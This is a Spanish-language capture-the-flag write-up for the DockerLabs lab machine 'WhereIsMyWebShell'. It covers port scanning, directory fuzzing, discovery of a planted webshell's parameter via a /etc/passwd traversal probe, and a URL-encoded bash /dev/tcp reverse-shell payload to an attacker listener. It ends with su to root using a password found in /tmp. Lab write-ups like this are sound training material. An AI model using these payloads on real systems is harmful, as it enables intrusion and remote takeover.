# 🖥️ Writeup - WhereIsMyWebShell 

**Plataforma:** Dockerlabs  
**Sistema Operativo:** Linux  

# INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash 
unzip whereismywebshell.zip
```
La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh whereismywebshell.tar
``` 
Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
``` 

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

# ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
``` 

```bash
nmap -n -Pn -sCV -p80 --min-rate 5000 172.17.0.2
```

Info:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 15:02 CET
Nmap scan report for 172.17.0.2
Host is up (0.000031s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Academia de Ingl\xC3\xA9s (Inglis Academi)
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.62 seconds
```

Solo el puerto `80` está accesible.

Al acceder a la página web, encontramos el siguiente comentario al final de la misma:

```
¡Contáctanos hoy mismo para más información sobre nuestros programas de enseñanza de inglés!. Guardo un secretito en /tmp ;)
```

Esto probablemente nos servirá más adelante.

# GOBUSTER

Realizamos `fuzzing` de directorios para intentar localizar directorios o archivos ocultos.

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,zip,php,txt,bak,sh -b 403,404 -t 60
```

Info:
```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,zip,php,txt,bak,sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 2510]
/shell.php            (Status: 500) [Size: 0]
/warning.html         (Status: 200) [Size: 315]
Progress: 1335871 / 1543899 (86.53%)
```

Encontramos un archivo `warning.html` que contiene el siguiente mensaje: 

```
Esta web ha sido atacada por otro hacker, pero su webshell tiene un parámetro que no recuerdo...
```

Intuimos que el archivo `shell.php` que hemos encontrado es la `webshell` que ha subido el atacante. Al intentar acceder a ella, el servidor devuelve un código de estado `500` (Internal Server Error).

Sin embargo, el mensaje en `warning.html` nos da una pista, la `webshell` requiere un `parámetro`, y este podría permitir `RCE` (Remote Code Execution)


# WFUZZ

Procedemos a intentar descubrir el `parámetro` mediante `fuzzing`.

```bash
wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://172.17.0.2/shell.php?FUZZ=../../../../../etc/passwd --hc 404 --hl 0
```

Info:
```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2/shell.php?FUZZ=../../../../../etc/passwd
Total requests: 220559

=====================================================================
ID           Response   Lines    Word       Chars       Payload                  
=====================================================================

000115401:   200        1 L      1 W        12 Ch       "parameter"              

Total time: 134.2338
Processed Requests: 220559
Filtered Requests: 220558
Requests/sec.: 1643.095
```

Encontramos un parámetro, `parameter`, que nos devuelve un código de estado `200` (OK)

# RCE

Probamos a ejecutar un comando usando el parámetro `parameter` que hemos encontrado.

```
http://172.17.0.2/shell.php?parameter=id
```

Info:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Confirmamos que tenemos ejecución remota de comandos (`RCE`), por lo que procedemos a obtener una `reverse shell`.

Generamos el `payload` y lo codificamos en formato `URL` para asegurar que se transmita correctamente.

```
bash -c 'bash -i >%26 %2fdev%2ftcp%2f172.17.0.1%2f4444 0>%261'
```

Ponemos un `listener` en nuestra máquina atacante, a la espera de la conexión.

```bash
sudo nc -nlvp 4444
```

Inyectamos el `payload` codificado en la `URL` como valor del parámetro `parameter`.

```
http://172.17.0.2/shell.php?parameter=bash -c 'bash -i >%26 %2fdev%2ftcp%2f172.17.0.1%2f4444 0>%261'
```

Info:
```
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 43934
bash: cannot set terminal process group (23): Inappropriate ioctl for device
bash: no job control in this shell
www-data@6aa01e22d477:/var/www/html$
``` 

Recibimos la conexión de la `reverse shell` con permisos del usuario `www-data`.

# TTY

Antes de buscar vectores de escalada de privilegios, vamos a hacer un tratamiento de TTY para tener una shell más interactiva, con los siguientes comandos:

```bash
script /dev/null -c bash
```
`ctrl Z`
```bash
stty raw -echo; fg
```
```bash
reset xterm
```
```bash
export TERM=xterm
```
```bash
export BASH=bash
```

# ESCALADA DE PRIVILEGIOS

Recordamos la pista anterior sobre un archivo en `/tmp`.

Navegamos al directorio `/tmp` y encontramos un archivo oculto, `.secret.txt`, que contiene lo que parece ser una contraseña.

```
www-data@6aa01e22d477:/tmp$ cat .secret.txt
contraseñaderoot123
```

Intentamos escalar privilegios a `root` con esta contraseña.

```bash
su root
```

Info:
```
www-data@6aa01e22d477:/tmp$ su root
Password: contraseñaderoot123
root@6aa01e22d477:/# whoami
root
```

¡Funciona! Ya somos root.